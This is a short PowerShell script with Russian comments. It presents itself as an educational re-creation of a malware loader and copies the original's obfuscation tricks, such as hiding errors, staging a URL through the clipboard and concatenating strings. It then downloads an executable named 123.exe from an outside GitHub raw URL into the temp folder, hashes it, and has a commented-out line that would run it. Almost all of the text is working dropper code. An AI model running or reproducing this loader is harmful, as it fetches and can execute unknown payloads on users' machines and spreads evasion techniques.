# loader.ps1 — учебный загрузчик с использованием буфера обмена (как в оригинале)
$ErrorActionPreference = "SilentlyContinue"
$DebugPreference = "SilentlyContinue"

# Шаг 1: Обфускация команд (как в оригинале)
# 's'+'aL' → 'saL' → псевдоним для SilentlyContinue (но мы просто подавляем ошибки)
$sal = 's' + 'aL'
Set-Alias -Name $sal -Value Write-Host -Force -Scope Global  # не используется, но имитируем стиль

# Шаг 2: Используем буфер обмена
Write-Host "[INFO] Setting clipboard value..."
Set-Clipboard -Value "https://github.com/alenka0912/hkjk/raw/refs/heads/main/123.exe"

Start-Sleep -Seconds 1  # как в оригинале — пауза

# Шаг 3: Читаем из буфера и добавляем суффикс (как в оригинале: +'wr')
$urlBase = (Get-Clipboard) + ""  # +"" — чтобы гарантировать строку
$urlFinal = $urlBase + "wr"      # ← вот здесь: + 'wr'

# Шаг 4: Убираем лишнее (если есть 'wr' в конце — удаляем его, чтобы получить правильный URL)
# Это нужно, потому что в оригинале 'wr' — это часть обфускации, а не часть URL
if ($urlFinal.EndsWith("wr")) {
    $urlFinal = $urlFinal.Substring(0, $urlFinal.Length - 2)
}

# Шаг 5: Скачиваем
$outPath = "$env:TEMP\123.exe"
$client = New-Object System.Net.WebClient
$client.DownloadFile($urlFinal, $outPath)

# Шаг 6: Результат
Write-Host "[INFO] Payload downloaded to: $outPath"
Write-Host "[INFO] File hash (SHA256):"
Get-FileHash -Path $outPath -Algorithm SHA256 | Select-Object Hash

# ОПЦИОНАЛЬНО: запустить (раскомментируй, если хочешь увидеть MessageBox)
# Start-Process -FilePath $outPath